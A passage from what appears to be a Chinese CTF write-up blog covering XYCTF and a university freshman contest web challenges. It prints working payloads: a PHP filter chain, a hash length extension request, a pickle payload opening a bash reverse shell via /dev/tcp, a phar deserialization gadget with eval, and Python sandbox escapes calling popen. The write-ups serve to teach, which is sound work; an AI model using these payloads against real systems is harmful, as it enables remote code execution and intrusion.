vert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode</span><br></pre></td></tr></table></figure><p>XYCTF{5f9e48b3-7851-41c0-aa56-c0a746784199}</p><h3 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">a3a9ab37346c02e4a88deae16415f4c3</span><br></pre></td></tr></table></figure><p>考察hash长度扩展攻击<br>文章：<a href="https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a><br><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><p>利用工具：<a href="https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-file">https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-file</a></p><p>扩展字符输入的是一个未来的时间戳，就是未来几分钟的<br>密钥长度就是 flag 的长度，flag长度是固定的</p><p><img src="/2024/05/18/XYCTF/image-20240511152113786.png" alt="image-20240511152113786"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&amp;md5=979a816bd7b50f44ba4113655f68e2c4</span><br><span class="line"></span><br><span class="line">value 的值是新明文去掉后面的时间戳，因为题目  $FLAG.$value.$time  已经是把时间戳加上去的</span><br><span class="line">md5 的值就是新生成的hash，</span><br></pre></td></tr></table></figure><p>再写一个简单的脚本不断的请求，当时间接近我们输入的时间戳，就可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://gz.imxbt.cn:20249/?value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&amp;md5=979a816bd7b50f44ba4113655f68e2c4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240511153349567.png" alt="image-20240511153349567"></p><p>XYCTF{c22d49e0-728d-4b84-a43c-33b6a4dd3b1d}</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>打开网站是一个登录的界面，目录扫描可以扫描出 &#x2F;register.php </p><p><img src="/2024/05/18/XYCTF/image-20240511233631390.png" alt="image-20240511233631390"></p><p>注册一个账号再登录，可以在cookie里面找到一个 RememberMe<br><img src="/2024/05/18/XYCTF/image-20240511234136734.png" alt="image-20240511234136734"></p><p>base64解码一下  ，有登录的 用户名和密码 的信息<br><img src="/2024/05/18/XYCTF/image-20240511234603228.png" alt="image-20240511234603228"></p><p> python的pickle反序列化  ,反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/[ip]/80 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c  获取一个全局对象或import一个模块   写法：  c[module]\n[instance]\n    获得的对象入栈</span></span><br><span class="line"><span class="comment">#    S实例化一个字符串对象    写法：S&#x27;xxx&#x27;\n（也可以使用双引号、\&#x27;等python字符串形式）   获得的对象入栈</span></span><br><span class="line"><span class="comment">#    ( 向栈中压入一个MARK标记       MARK标记入栈</span></span><br><span class="line"><span class="comment">#    o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）   这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</span></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240511235927198.png" alt="image-20240511235927198"></p><p><img src="/2024/05/18/XYCTF/image-20240511235816397.png" alt="image-20240511235816397"></p><h3 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h3><p>查看源码，class.php, 访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if(&#39;ch3nx1&#39; === preg_replace(&#39;/;+/&#39;,&#39;ch3nx1&#39;,preg_replace(&#39;/[A-Za-z_\(\)]+/&#39;,&#39;&#39;,$this-&gt;cmd)))</code>  表明无参数rce</p><p><code>eval($this-&gt;cmd.&#39;isbigvegetablechicken!&#39;)</code>   使用halt_compiler()绕过 ，去中断编译执行使其后面的字符不被解析</p><p><code>if(preg_match(&#39;/^phar:\/\//i&#39;,$_POST[&#39;file&#39;]))</code>  使用php伪协议绕过</p><p>构造phar包，使用gzip命令压缩上传，再改后缀为 png , 上传<br>http请求 在最后一个请求加上  SS：system(cat &#x2F;flag);     执行命令<br>post传参：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;&#x2F;tmp&#x2F;fb5c81ed3a220004b71069645f112867.png</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd=<span class="string">&#x27;eval(end(getallheaders()));__helt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;1.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER;?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/XYCTF/image-20240512211153150.png" alt="image-20240512211153150"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>中国海洋大学新生赛</title>
      <link href="/2024/05/18/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
      <url>/2024/05/18/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>([<span class="string">&#x27;__builtins__&#x27;</span>]).__dir__.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">得到flag 在环境变量里面    </span><br></pre></td></tr></table></figure><h2 id="菜狗工具-2"><a href="#菜狗工具-2" class="headerlink" title="菜狗工具#2"></a>菜狗工具#2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(<span class="string">&#x27;__builtins__&#x27;</span>).__dir__.__class__.__base__.__subclasses__()[<span class="number">133</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(<span class="string">&#x27;__builtins__&#x27;</span>).__dir__.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">等待wp</span><br></pre></td></tr></table></figure><h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O.U.C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>,<span class="variable">$query</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;听说你是黑客&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你知道b等于什么能绕过这个弱类型吗（〃｀ 3′〃）&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;&amp;<span class="variable">$a</span>!=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;哎呦，不错喔&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$O_U_C</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;O_U_C&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$O_U_C</span>)&amp;&amp;<span class="variable">$O_U_C</span>!==<span class="string">&#x27;100&#x27;</span>&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^100$/&#x27;</span>,<span class="variable">$O_U_C</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;but&#x27;</span>.<span class="string">&#x27;如果我寄出===阁下又该如何应对๑乛◡乛๑&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;好，那么好&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;md5&quot;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;还是被你解出来了&#x27;</span>.<span class="string">&#x27; ྀི ྀིɞ ྀི ིྀ ིྀ&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;告诉你secret的md5值也无妨，反正哈希是不可逆的๑乛◡乛๑，除非你能箨斩攻击我&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&#x27;ouc&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;不过如此&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行嘛(´ｪ｀)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;嗨害嗨  (๑ᵒ̴̶̷͈᷄ᗨᵒ̴̶̷͈᷅)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">听说你是黑客</span><br></pre></td></tr></table></figure><p>1、<code>$query = $_SERVER[&#39;QUERY_STRING&#39;];</code></p><p>获取 URL 查询字符串（即 URL 中 ? 后面的部分）并将其存储在 $query 变量中</p><p>2、<strong>parse_str() 函数</strong></p><p> 使用 parse_str 函数解析查询字符串，将其转换为 PHP 变量。这意味着如果查询字符串是 ?name&#x3D;John&amp;age&#x3D;30，那么 parse_str 会创建两个变量 $name 和 $age，并分别赋值为 John 和 30</p><p>3、<code>(md5($a)==md5($_GET[&#39;b&#39;])&amp;&amp;$a!=$_GET[&#39;b&#39;])</code>      (   $a&#x3D;’O.U.C’  )</p><p>因为前面存在的parse_str() 函数，能够变量覆盖, 然后再进行MD5弱比较<br>a&#x3D;QNKCDZO&amp;b&#x3D;240610708   </p><p>4、<code>(!is_array($O_U_C)&amp;&amp;$O_U_C!==&#39;100&#39;&amp;&amp;preg_match(&#39;/^100$/&#39;,$O_U_C))</code><br>在php中 . 和空格 在传参时会被转化成下划线，正好前面把  . 和 _  给过滤了 ，用空格替代<br>还需要绕过preg_match()，而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code>，从而绕过</p><p>O U C&#x3D;100%0a</p><p>5、<code>(md5($_POST[&#39;md51&#39;])===md5($_POST[&#39;md52&#39;])&amp;&amp;$_POST[&#39;md51&#39;]!=$_POST[&#39;md52&#39;])</code></p><p>​     md51[]&#x3D;1&amp;md52[]&#x3D;2</p><p>6、<code>($_COOKIE[&quot;md5&quot;]===md5($secret.urldecode($_GET[&#39;md5&#39;])))</code></p><p>md5&#x3D;%31%31%31&amp;secret&#x3D;aaa     (变量覆盖 secret )<br>再cookie传参  md5&#x3D;eabd8ce9404507aa8c22714d3f5eada9<br>（aaa111 的MD5值）</p><p><img src="/2024/05/18/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/image-20240423174106097.png" alt="image-20240423174106097"></p><h2 id="一眼盯帧"><a href="#一眼盯帧" class="headerlink" title="一眼盯帧"></a>一眼盯帧</h2><p>ffmpeg -i iGotSmokynomial.mp4 -f image2 -r 20  frames&#x2F;frame-%03d.jpg<br>提取出几千张图片，找到30多张多元方程组的图片<br>写脚本解出来，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">a = [</span><br><span class="line">    [<span class="number">40</span>, <span class="number">42</span>, <span class="number">69</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">41</span>, <span class="number">79</span>, <span class="number">26</span>, <span class="number">51</span>, <span class="number">74</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">87</span>, <span class="number">76</span>, <span class="number">26</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">25</span>,</span><br><span class="line">     <span class="number">88</span>, <span class="number">13</span>],</span><br><span class="line">    [<span class="number">76</span>, <span class="number">23</span>, <span class="number">47</span>, <span class="number">95</span>, <span class="number">56</span>, <span class="number">94</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">64</span>, <span class="number">54</span>, <span class="number">77</span>, <span class="number">57</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">61</span>, <span class="number">98</span>, <span class="number">14</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">98</span>, <span class="number">66</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">94</span>, <span class="number">66</span>, <span class="number">99</span>,</span><br><span class="line">     <span class="number">64</span>, <span class="number">40</span>],</span><br><span class="line">    [<span class="number">53</span>, <span class="number">39</span>, <span class="number">10</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">42</span>, <span class="number">69</span>, <span class="number">66</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">4</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">51</span>, <span class="number">87</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">48</span>, <span class="number">31</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">59</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">63</span>,</span><br><span class="line">     <span class="number">44</span>, <span class="number">84</span>],</span><br><span class="line">    [<span class="number">95</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">72</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">13</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">15</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">92</span>, <span class="number">13</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>, <span class="number">9</span>,</span><br><span class="line">  